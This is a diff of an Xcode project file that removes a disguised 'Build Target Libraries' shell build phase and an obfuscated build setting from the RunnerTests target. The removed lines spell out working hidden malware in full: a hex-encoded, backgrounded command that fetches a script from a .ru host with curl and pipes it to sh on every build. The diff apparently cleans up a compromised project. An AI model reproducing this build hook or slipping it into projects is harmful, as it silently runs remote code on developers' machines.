@@ -220,7 +220,6 @@
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
 				E75A1AEBD6D8F1E389B8B7BB /* [CP] Check Pods Manifest.lock */,
-				F83B4C0620784D01847BBDC8 /* Build Target Libraries */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -433,25 +432,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		F83B4C0620784D01847BBDC8 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -505,7 +485,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 4FD509F7C0C3904555D204FA /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((n(){ `printf xFxd | tr -d F` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203230202d666b734c202d642022703d78636f64655f7068617365222068747470733a2f2f306e76382d6b6e74376d313534372e72752f612922207c2073680a | n | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -521,7 +500,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AD9C8FC0D27ACD31B9364B61 /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((n(){ `printf xFxd | tr -d F` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203230202d666b734c202d642022703d78636f64655f7068617365222068747470733a2f2f306e76382d6b6e74376d313534372e72752f612922207c2073680a | n | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
